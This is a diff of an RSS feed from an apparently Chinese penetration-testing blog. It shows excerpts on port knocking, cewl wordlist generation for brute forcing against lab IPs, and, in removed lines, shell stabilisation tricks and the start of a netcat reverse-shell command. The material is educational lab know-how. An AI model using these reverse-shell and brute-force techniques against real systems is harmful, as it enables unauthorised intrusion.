@@ -8,14 +8,7 @@
 下面是端口敲门的命令演示：
 knock 敲门演示：
 ┌──(kali㉿kali)-[~/Work/Kali] └─$ knock -v 10.10.10.45 197 719 801 983 hitting tcp 10.10.10.45:197 hitting tcp 10.10.10.45:719 hitting tcp 10.10.10.45:801 hitting tcp 10.10.10.45:983 nc 敲门演示：
-┌──(kali㉿kali)-[~/Work/Kali] └─$ for port in 197 719 801 983 ; do nc -zv 10.</description></item><item><title>渗透测试通用方法论</title><link>https://enilmalus.github.io/tools/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%BA/</link><pubDate>Sat, 27 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/tools/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%BA/</guid><description>本文章持续更新中
-遇见的情况以及方法论 图片分析 图片分析一般先查看隐写情况。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ steghide extract -sf x.jpg Enter passphrase: 解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 &amp;ndash;stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。
-Bash 逃逸 在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。
-python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;);&amp;#34; 运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。
-也可以尝试下面的命令。
-script -qc /bin/bash /dev/null script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。
-反弹 shell Linux 现成的反弹 shell nc -e /bin/bash 10.</description></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/tools/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/tools/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>在遇到目标网站且使用 kali 默认的 rockyou 字典爆破时间过长时可以尝试通过 cewl 与 john 结合生成目标定制的字典缩短爆破时间。
+┌──(kali㉿kali)-[~/Work/Kali] └─$ for port in 197 719 801 983 ; do nc -zv 10.</description></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/tools/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/tools/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>在遇到目标网站且使用 kali 默认的 rockyou 字典爆破时间过长时可以尝试通过 cewl 与 john 结合生成目标定制的字典缩短爆破时间。
 可能使用到的 Cewl 及 john 命令及解释 Cewl 语句及其解释 sudo cewl http://10.10.10.48 -w password.txt 这个命令直接指定 url 生成一个包含所有提取单词的字典文件，并保存为 password.txt 文件。
 sudo cewl -m 6 http://10.10.10.48 -w password.txt 这个命令使用 -m 6 设置提取的单词长度最小为 6 。
 sudo cewl -d 2 http://10.10.10.48 -w password.txt 这个命令使用 -d 2 使 Cewl 递归爬取网站内部链接，深度为 2 。
